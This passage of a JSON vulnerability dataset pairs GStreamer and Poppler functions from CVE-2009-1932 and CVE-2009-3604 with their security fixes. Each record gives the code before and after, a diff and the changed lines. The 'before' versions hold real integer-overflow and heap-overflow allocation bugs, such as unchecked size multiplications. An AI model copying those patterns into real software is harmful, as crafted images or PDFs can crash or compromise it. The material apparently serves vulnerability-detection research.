        "diff_func": "--- func_before\n+++ func_after\n@@ -33,7 +33,12 @@\n \n   /* Allocate output buffer */\n   rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n-  buffer_size = pngdec->height * GST_ROUND_UP_4 (rowbytes);\n+  if (rowbytes > (G_MAXUINT32 - 3) || pngdec->height > G_MAXUINT32 / rowbytes) {\n+    ret = GST_FLOW_ERROR;\n+    goto pause;\n+  }\n+  rowbytes = GST_ROUND_UP_4 (rowbytes);\n+  buffer_size = pngdec->height * rowbytes;\n   ret =\n       gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n       buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n@@ -46,7 +51,7 @@\n \n   for (i = 0; i < pngdec->height; i++) {\n     rows[i] = inp;\n-    inp += GST_ROUND_UP_4 (rowbytes);\n+    inp += rowbytes;\n   }\n \n   /* Read the actual picture */",
        "diff_line_info": {
            "deleted_lines": [
                "  buffer_size = pngdec->height * GST_ROUND_UP_4 (rowbytes);",
                "    inp += GST_ROUND_UP_4 (rowbytes);"
            ],
            "added_lines": [
                "  if (rowbytes > (G_MAXUINT32 - 3) || pngdec->height > G_MAXUINT32 / rowbytes) {",
                "    ret = GST_FLOW_ERROR;",
                "    goto pause;",
                "  }",
                "  rowbytes = GST_ROUND_UP_4 (rowbytes);",
                "  buffer_size = pngdec->height * rowbytes;",
                "    inp += rowbytes;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1932",
        "func_name": "gstreamer/gst-plugins-good/user_info_callback",
        "description": "Multiple integer overflows in the (1) user_info_callback, (2) user_endrow_callback, and (3) gst_pngdec_task functions (ext/libpng/gstpngdec.c) in GStreamer Good Plug-ins (aka gst-plugins-good or gstreamer-plugins-good) 0.10.15 allow remote attackers to cause a denial of service and possibly execute arbitrary code via a crafted PNG file, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/gstreamer/gst-plugins-good/commit/?id=d9544bcc44adcef769cbdf7f6453e140058a3adc",
        "commit_title": "A malformed (or simply huge) PNG file can lead to integer overflow in",
        "commit_text": "calculating the size of the output buffer, leading to crashes or buffer overflows later. Fixes SA35205 security advisory. ",
        "func_before": "static void\nuser_info_callback (png_structp png_ptr, png_infop info)\n{\n  GstPngDec *pngdec = NULL;\n  GstFlowReturn ret = GST_FLOW_OK;\n  size_t buffer_size;\n  GstBuffer *buffer = NULL;\n\n  pngdec = GST_PNGDEC (png_ptr->io_ptr);\n\n  GST_LOG (\"info ready\");\n\n  /* Generate the caps and configure */\n  ret = gst_pngdec_caps_create_and_set (pngdec);\n  if (ret != GST_FLOW_OK) {\n    goto beach;\n  }\n\n  /* Allocate output buffer */\n  pngdec->rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n  buffer_size = pngdec->height * GST_ROUND_UP_4 (pngdec->rowbytes);\n  ret =\n      gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n      buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n  if (ret != GST_FLOW_OK) {\n    goto beach;\n  }\n\n  pngdec->buffer_out = buffer;\n\nbeach:\n  pngdec->ret = ret;\n}",
        "func": "static void\nuser_info_callback (png_structp png_ptr, png_infop info)\n{\n  GstPngDec *pngdec = NULL;\n  GstFlowReturn ret = GST_FLOW_OK;\n  size_t buffer_size;\n  GstBuffer *buffer = NULL;\n\n  pngdec = GST_PNGDEC (png_ptr->io_ptr);\n\n  GST_LOG (\"info ready\");\n\n  /* Generate the caps and configure */\n  ret = gst_pngdec_caps_create_and_set (pngdec);\n  if (ret != GST_FLOW_OK) {\n    goto beach;\n  }\n\n  /* Allocate output buffer */\n  pngdec->rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n  if (pngdec->rowbytes > (G_MAXUINT32 - 3)\n      || pngdec->height > G_MAXUINT32 / pngdec->rowbytes) {\n    ret = GST_FLOW_ERROR;\n    goto beach;\n  }\n  pngdec->rowbytes = GST_ROUND_UP_4 (pngdec->rowbytes);\n  buffer_size = pngdec->height * pngdec->rowbytes;\n\n  ret =\n      gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n      buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n  if (ret != GST_FLOW_OK) {\n    goto beach;\n  }\n\n  pngdec->buffer_out = buffer;\n\nbeach:\n  pngdec->ret = ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -18,7 +18,14 @@\n \n   /* Allocate output buffer */\n   pngdec->rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n-  buffer_size = pngdec->height * GST_ROUND_UP_4 (pngdec->rowbytes);\n+  if (pngdec->rowbytes > (G_MAXUINT32 - 3)\n+      || pngdec->height > G_MAXUINT32 / pngdec->rowbytes) {\n+    ret = GST_FLOW_ERROR;\n+    goto beach;\n+  }\n+  pngdec->rowbytes = GST_ROUND_UP_4 (pngdec->rowbytes);\n+  buffer_size = pngdec->height * pngdec->rowbytes;\n+\n   ret =\n       gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n       buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);",
        "diff_line_info": {
            "deleted_lines": [
                "  buffer_size = pngdec->height * GST_ROUND_UP_4 (pngdec->rowbytes);"
            ],
            "added_lines": [
                "  if (pngdec->rowbytes > (G_MAXUINT32 - 3)",
                "      || pngdec->height > G_MAXUINT32 / pngdec->rowbytes) {",
                "    ret = GST_FLOW_ERROR;",
                "    goto beach;",
                "  }",
                "  pngdec->rowbytes = GST_ROUND_UP_4 (pngdec->rowbytes);",
                "  buffer_size = pngdec->height * pngdec->rowbytes;",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3604",
        "func_name": "poppler/SplashOutputDev::drawImage",
        "description": "The Splash::drawImage function in Splash.cc in Xpdf 2.x and 3.x before 3.02pl4, and Poppler 0.x, as used in GPdf and kdegraphics KPDF, does not properly allocate memory, which allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF document that triggers a NULL pointer dereference or a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/?id=284a928996&id2=75c3466ba2",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  // special case for one-channel (monochrome/gray/separation) images:\n  // build a lookup table here\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n      }\n      break;\n    case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}",
        "func": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  // special case for one-channel (monochrome/gray/separation) images:\n  // build a lookup table here\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n      }\n      break;\n    case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -61,7 +61,7 @@\n       }\n       break;\n     case splashModeXBGR8:\n-      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);",
        "diff_line_info": {
            "deleted_lines": [
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);"
            ],
            "added_lines": [
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3604",
        "func_name": "poppler/poppler_page_prepare_output_dev",
        "description": "The Splash::drawImage function in Splash.cc in Xpdf 2.x and 3.x before 3.02pl4, and Poppler 0.x, as used in GPdf and kdegraphics KPDF, does not properly allocate memory, which allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF document that triggers a NULL pointer dereference or a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb2",
        "commit_title": "",
        "commit_text": "",
        "func_before": "static void\npoppler_page_prepare_output_dev (PopplerPage *page,\n\t\t\t\t double scale,\n\t\t\t\t int rotation,\n\t\t\t\t gboolean transparent,\n\t\t\t\t OutputDevData *output_dev_data)\n{\n  CairoOutputDev *output_dev;\n  cairo_surface_t *surface;\n  double width, height;\n  int cairo_width, cairo_height, cairo_rowstride, rotate;\n  unsigned char *cairo_data;\n\n  rotate = rotation + page->page->getRotate ();\n  if (rotate == 90 || rotate == 270) {\n    height = page->page->getCropWidth ();\n    width = page->page->getCropHeight ();\n  } else {\n    width = page->page->getCropWidth ();\n    height = page->page->getCropHeight ();\n  }\n\n  cairo_width = (int) ceil(width * scale);\n  cairo_height = (int) ceil(height * scale);\n\n  output_dev = page->document->output_dev;\n  cairo_rowstride = cairo_width * 4;\n  cairo_data = (guchar *) gmalloc (cairo_height * cairo_rowstride);\n  if (transparent)\n      memset (cairo_data, 0x00, cairo_height * cairo_rowstride);\n  else\n      memset (cairo_data, 0xff, cairo_height * cairo_rowstride);\n\n  surface = cairo_image_surface_create_for_data(cairo_data,\n\t\t\t\t\t\tCAIRO_FORMAT_ARGB32,\n\t  \t\t\t\t\tcairo_width, cairo_height, \n\t\t\t\t\t\tcairo_rowstride);\n\n  output_dev_data->cairo_data = cairo_data;\n  output_dev_data->surface = surface;\n  output_dev_data->cairo = cairo_create (surface);\n  output_dev->setCairo (output_dev_data->cairo);\n}",
        "func": "static void\npoppler_page_prepare_output_dev (PopplerPage *page,\n\t\t\t\t double scale,\n\t\t\t\t int rotation,\n\t\t\t\t gboolean transparent,\n\t\t\t\t OutputDevData *output_dev_data)\n{\n  CairoOutputDev *output_dev;\n  cairo_surface_t *surface;\n  double width, height;\n  int cairo_width, cairo_height, cairo_rowstride, rotate;\n  unsigned char *cairo_data;\n\n  rotate = rotation + page->page->getRotate ();\n  if (rotate == 90 || rotate == 270) {\n    height = page->page->getCropWidth ();\n    width = page->page->getCropHeight ();\n  } else {\n    width = page->page->getCropWidth ();\n    height = page->page->getCropHeight ();\n  }\n\n  cairo_width = (int) ceil(width * scale);\n  cairo_height = (int) ceil(height * scale);\n\n  output_dev = page->document->output_dev;\n  cairo_rowstride = cairo_width * 4;\n  cairo_data = (guchar *) gmallocn (cairo_height, cairo_rowstride);\n  if (transparent)\n      memset (cairo_data, 0x00, cairo_height * cairo_rowstride);\n  else\n      memset (cairo_data, 0xff, cairo_height * cairo_rowstride);\n\n  surface = cairo_image_surface_create_for_data(cairo_data,\n\t\t\t\t\t\tCAIRO_FORMAT_ARGB32,\n\t  \t\t\t\t\tcairo_width, cairo_height, \n\t\t\t\t\t\tcairo_rowstride);\n\n  output_dev_data->cairo_data = cairo_data;\n  output_dev_data->surface = surface;\n  output_dev_data->cairo = cairo_create (surface);\n  output_dev->setCairo (output_dev_data->cairo);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -25,7 +25,7 @@\n \n   output_dev = page->document->output_dev;\n   cairo_rowstride = cairo_width * 4;\n-  cairo_data = (guchar *) gmalloc (cairo_height * cairo_rowstride);\n+  cairo_data = (guchar *) gmallocn (cairo_height, cairo_rowstride);\n   if (transparent)\n       memset (cairo_data, 0x00, cairo_height * cairo_rowstride);\n   else",
        "diff_line_info": {
            "deleted_lines": [
                "  cairo_data = (guchar *) gmalloc (cairo_height * cairo_rowstride);"
            ],
            "added_lines": [
                "  cairo_data = (guchar *) gmallocn (cairo_height, cairo_rowstride);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3604",
        "func_name": "poppler/SplashBitmap::SplashBitmap",
        "description": "The Splash::drawImage function in Splash.cc in Xpdf 2.x and 3.x before 3.02pl4, and Poppler 0.x, as used in GPdf and kdegraphics KPDF, does not properly allocate memory, which allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF document that triggers a NULL pointer dereference or a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb2",
        "commit_title": "",
        "commit_text": "",
        "func_before": "SplashBitmap::SplashBitmap(int widthA, int heightA, int rowPad,\n\t\t\t   SplashColorMode modeA, GBool alphaA,\n\t\t\t   GBool topDown) {\n  width = widthA;\n  height = heightA;\n  mode = modeA;\n  switch (mode) {\n  case splashModeMono1:\n    rowSize = (width + 7) >> 3;\n    break;\n  case splashModeMono8:\n    rowSize = width;\n    break;\n  case splashModeRGB8:\n  case splashModeBGR8:\n    rowSize = width * 3;\n    break;\n  case splashModeXBGR8:\n    rowSize = width * 4;\n    break;\n#if SPLASH_CMYK\n  case splashModeCMYK8:\n    rowSize = width * 4;\n    break;\n#endif\n  }\n  rowSize += rowPad - 1;\n  rowSize -= rowSize % rowPad;\n  data = (SplashColorPtr)gmalloc(rowSize * height);\n  if (!topDown) {\n    data += (height - 1) * rowSize;\n    rowSize = -rowSize;\n  }\n  if (alphaA) {\n    alpha = (Guchar *)gmalloc(width * height);\n  } else {\n    alpha = NULL;\n  }\n}",
        "func": "SplashBitmap::SplashBitmap(int widthA, int heightA, int rowPad,\n\t\t\t   SplashColorMode modeA, GBool alphaA,\n\t\t\t   GBool topDown) {\n  width = widthA;\n  height = heightA;\n  mode = modeA;\n  switch (mode) {\n  case splashModeMono1:\n    rowSize = (width + 7) >> 3;\n    break;\n  case splashModeMono8:\n    rowSize = width;\n    break;\n  case splashModeRGB8:\n  case splashModeBGR8:\n    rowSize = width * 3;\n    break;\n  case splashModeXBGR8:\n    rowSize = width * 4;\n    break;\n#if SPLASH_CMYK\n  case splashModeCMYK8:\n    rowSize = width * 4;\n    break;\n#endif\n  }\n  rowSize += rowPad - 1;\n  rowSize -= rowSize % rowPad;\n  data = (SplashColorPtr)gmallocn(rowSize, height);\n  if (!topDown) {\n    data += (height - 1) * rowSize;\n    rowSize = -rowSize;\n  }\n  if (alphaA) {\n    alpha = (Guchar *)gmallocn(width, height);\n  } else {\n    alpha = NULL;\n  }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -26,13 +26,13 @@\n   }\n   rowSize += rowPad - 1;\n   rowSize -= rowSize % rowPad;\n-  data = (SplashColorPtr)gmalloc(rowSize * height);\n+  data = (SplashColorPtr)gmallocn(rowSize, height);\n   if (!topDown) {\n     data += (height - 1) * rowSize;\n     rowSize = -rowSize;\n   }\n   if (alphaA) {\n-    alpha = (Guchar *)gmalloc(width * height);\n+    alpha = (Guchar *)gmallocn(width, height);\n   } else {\n     alpha = NULL;\n   }",
        "diff_line_info": {
            "deleted_lines": [
                "  data = (SplashColorPtr)gmalloc(rowSize * height);",
                "    alpha = (Guchar *)gmalloc(width * height);"
            ],
            "added_lines": [
                "  data = (SplashColorPtr)gmallocn(rowSize, height);",
                "    alpha = (Guchar *)gmallocn(width, height);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3604",
        "func_name": "poppler/SplashFTFont::makeGlyph",
        "description": "The Splash::drawImage function in Splash.cc in Xpdf 2.x and 3.x before 3.02pl4, and Poppler 0.x, as used in GPdf and kdegraphics KPDF, does not properly allocate memory, which allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF document that triggers a NULL pointer dereference or a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb2",
        "commit_title": "",
        "commit_text": "",
        "func_before": "GBool SplashFTFont::makeGlyph(int c, int xFrac, int yFrac,\n\t\t\t      SplashGlyphBitmap *bitmap, int x0, int y0, SplashClip *clip, SplashClipResult *clipRes) {\n  SplashFTFontFile *ff;\n  FT_Vector offset;\n  FT_GlyphSlot slot;\n  FT_UInt gid;\n  int rowSize;\n  Guchar *p, *q;\n  int i;\n\n  ff = (SplashFTFontFile *)fontFile;\n\n  ff->face->size = sizeObj;\n  offset.x = (FT_Pos)(int)((SplashCoord)xFrac * splashFontFractionMul * 64);\n  offset.y = 0;\n  FT_Set_Transform(ff->face, &matrix, &offset);\n  slot = ff->face->glyph;\n\n  if (ff->codeToGID && c < ff->codeToGIDLen) {\n    gid = (FT_UInt)ff->codeToGID[c];\n  } else {\n    gid = (FT_UInt)c;\n  }\n  if (ff->trueType && gid == 0) {\n    // skip the TrueType notdef glyph\n    return gFalse;\n  }\n\n  // if we have the FT2 bytecode interpreter, autohinting won't be used\n#ifdef TT_CONFIG_OPTION_BYTECODE_INTERPRETER\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_BITMAP : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#else\n  // FT2's autohinting doesn't always work very well (especially with\n  // font subsets), so turn it off if anti-aliasing is enabled; if\n  // anti-aliasing is disabled, this seems to be a tossup - some fonts\n  // look better with hinting, some without, so leave hinting on\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_HINTING | FT_LOAD_NO_BITMAP\n                       : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#endif\n\n  FT_Glyph_Metrics *glyphMetrics = &(ff->face->glyph->metrics);\n  // prelimirary values from FT_Glyph_Metrics\n  bitmap->x = splashRound(-glyphMetrics->horiBearingX / 64.0);\n  bitmap->y = splashRound(glyphMetrics->horiBearingY / 64.0);\n  bitmap->w = splashRound(glyphMetrics->width / 64.0);\n  bitmap->h = splashRound(glyphMetrics->height / 64.0);\n\n  *clipRes = clip->testRect(x0 - bitmap->x,\n                            y0 - bitmap->y,\n                            x0 - bitmap->x + bitmap->w,\n                            y0 - bitmap->y + bitmap->h);\n  if (*clipRes == splashClipAllOutside) {\n    bitmap->freeData = gFalse;\n    return gTrue;\n  }\n\n  if (FT_Render_Glyph(slot, aa ? ft_render_mode_normal\n\t\t               : ft_render_mode_mono)) {\n    return gFalse;\n  }\n\n  bitmap->x = -slot->bitmap_left;\n  bitmap->y = slot->bitmap_top;\n  bitmap->w = slot->bitmap.width;\n  bitmap->h = slot->bitmap.rows;\n  bitmap->aa = aa;\n  if (aa) {\n    rowSize = bitmap->w;\n  } else {\n    rowSize = (bitmap->w + 7) >> 3;\n  }\n  bitmap->data = (Guchar *)gmalloc(rowSize * bitmap->h);\n  bitmap->freeData = gTrue;\n  for (i = 0, p = bitmap->data, q = slot->bitmap.buffer;\n       i < bitmap->h;\n       ++i, p += rowSize, q += slot->bitmap.pitch) {\n    memcpy(p, q, rowSize);\n  }\n\n  return gTrue;\n}",
        "func": "GBool SplashFTFont::makeGlyph(int c, int xFrac, int yFrac,\n\t\t\t      SplashGlyphBitmap *bitmap, int x0, int y0, SplashClip *clip, SplashClipResult *clipRes) {\n  SplashFTFontFile *ff;\n  FT_Vector offset;\n  FT_GlyphSlot slot;\n  FT_UInt gid;\n  int rowSize;\n  Guchar *p, *q;\n  int i;\n\n  ff = (SplashFTFontFile *)fontFile;\n\n  ff->face->size = sizeObj;\n  offset.x = (FT_Pos)(int)((SplashCoord)xFrac * splashFontFractionMul * 64);\n  offset.y = 0;\n  FT_Set_Transform(ff->face, &matrix, &offset);\n  slot = ff->face->glyph;\n\n  if (ff->codeToGID && c < ff->codeToGIDLen) {\n    gid = (FT_UInt)ff->codeToGID[c];\n  } else {\n    gid = (FT_UInt)c;\n  }\n  if (ff->trueType && gid == 0) {\n    // skip the TrueType notdef glyph\n    return gFalse;\n  }\n\n  // if we have the FT2 bytecode interpreter, autohinting won't be used\n#ifdef TT_CONFIG_OPTION_BYTECODE_INTERPRETER\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_BITMAP : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#else\n  // FT2's autohinting doesn't always work very well (especially with\n  // font subsets), so turn it off if anti-aliasing is enabled; if\n  // anti-aliasing is disabled, this seems to be a tossup - some fonts\n  // look better with hinting, some without, so leave hinting on\n  if (FT_Load_Glyph(ff->face, gid,\n\t\t    aa ? FT_LOAD_NO_HINTING | FT_LOAD_NO_BITMAP\n                       : FT_LOAD_DEFAULT)) {\n    return gFalse;\n  }\n#endif\n\n  FT_Glyph_Metrics *glyphMetrics = &(ff->face->glyph->metrics);\n  // prelimirary values from FT_Glyph_Metrics\n  bitmap->x = splashRound(-glyphMetrics->horiBearingX / 64.0);\n  bitmap->y = splashRound(glyphMetrics->horiBearingY / 64.0);\n  bitmap->w = splashRound(glyphMetrics->width / 64.0);\n  bitmap->h = splashRound(glyphMetrics->height / 64.0);\n\n  *clipRes = clip->testRect(x0 - bitmap->x,\n                            y0 - bitmap->y,\n                            x0 - bitmap->x + bitmap->w,\n                            y0 - bitmap->y + bitmap->h);\n  if (*clipRes == splashClipAllOutside) {\n    bitmap->freeData = gFalse;\n    return gTrue;\n  }\n\n  if (FT_Render_Glyph(slot, aa ? ft_render_mode_normal\n\t\t               : ft_render_mode_mono)) {\n    return gFalse;\n  }\n\n  bitmap->x = -slot->bitmap_left;\n  bitmap->y = slot->bitmap_top;\n  bitmap->w = slot->bitmap.width;\n  bitmap->h = slot->bitmap.rows;\n  bitmap->aa = aa;\n  if (aa) {\n    rowSize = bitmap->w;\n  } else {\n    rowSize = (bitmap->w + 7) >> 3;\n  }\n  bitmap->data = (Guchar *)gmallocn(rowSize, bitmap->h);\n  bitmap->freeData = gTrue;\n  for (i = 0, p = bitmap->data, q = slot->bitmap.buffer;\n       i < bitmap->h;\n       ++i, p += rowSize, q += slot->bitmap.pitch) {\n    memcpy(p, q, rowSize);\n  }\n\n  return gTrue;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -75,7 +75,7 @@\n   } else {\n     rowSize = (bitmap->w + 7) >> 3;\n   }\n-  bitmap->data = (Guchar *)gmalloc(rowSize * bitmap->h);\n+  bitmap->data = (Guchar *)gmallocn(rowSize, bitmap->h);\n   bitmap->freeData = gTrue;\n   for (i = 0, p = bitmap->data, q = slot->bitmap.buffer;\n        i < bitmap->h;",
        "diff_line_info": {
            "deleted_lines": [
                "  bitmap->data = (Guchar *)gmalloc(rowSize * bitmap->h);"
            ],
            "added_lines": [
                "  bitmap->data = (Guchar *)gmallocn(rowSize, bitmap->h);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3604",
        "func_name": "poppler/Splash::fillImageMask",
        "description": "The Splash::drawImage function in Splash.cc in Xpdf 2.x and 3.x before 3.02pl4, and Poppler 0.x, as used in GPdf and kdegraphics KPDF, does not properly allocate memory, which allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF document that triggers a NULL pointer dereference or a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/?id=9cf2325fb2",
        "commit_title": "",
        "commit_text": "",
